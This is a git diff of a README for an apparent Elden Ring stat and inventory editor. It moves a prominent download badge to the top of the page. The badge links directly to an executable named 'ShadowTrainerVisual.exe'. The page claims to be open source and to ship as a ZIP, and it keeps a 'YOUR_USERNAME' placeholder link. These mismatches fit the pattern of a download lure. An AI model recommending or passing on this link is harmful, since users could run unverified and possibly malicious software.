@@ -1,5 +1,12 @@
 # Elden Ring Player and Inventory Editor
 
+### 📥 Download & Discuss
+
+[![DOWNLOAD v1.0](https://img.shields.io/badge/DOWNLOAD%20v1.0-READY!-brightgreen?style=for-the-badge&logo=windows)](https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/download/elden-ring/ShadowTrainerVisual.exe)  
+[![ALL RELEASES](https://img.shields.io/badge/ALL%20RELEASES-blue?style=for-the-badge)](https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/tag/elden-ring)  
+[![DISCUSS](https://img.shields.io/badge/DISCUSS-purple?style=for-the-badge)](https://github.com/YOUR_USERNAME/elden-ring-player-inventory-editor/discussions)  
+MIT License • Open Source
+
 **Updated: March 17, 2026**
 
 <img width="431" height="704" alt="image" src="https://github.com/user-attachments/assets/95abee18-9330-41b0-863d-608e644d8d47" />
@@ -12,13 +19,6 @@
 Edit player stats, inventory, runes and more with a sleek overlay menu. Fully offline, no game modification.
 
 *Windows ZIP • Extract and run .exe • Always backup your save files before using any tool!*
-
-### 📥 Download & Discuss
-
-[![DOWNLOAD v1.0](https://img.shields.io/badge/DOWNLOAD%20v1.0-READY!-brightgreen?style=for-the-badge&logo=windows)](https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/download/elden-ring/ShadowTrainerVisual.exe)  
-[![ALL RELEASES](https://img.shields.io/badge/ALL%20RELEASES-blue?style=for-the-badge)](https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/tag/elden-ring)  
-[![DISCUSS](https://img.shields.io/badge/DISCUSS-purple?style=for-the-badge)](https://github.com/YOUR_USERNAME/elden-ring-player-inventory-editor/discussions)  
-MIT License • Open Source
 
 **Made with ❤️ for the Elden Ring community • MIT License • v1.0 — March 2026**
 
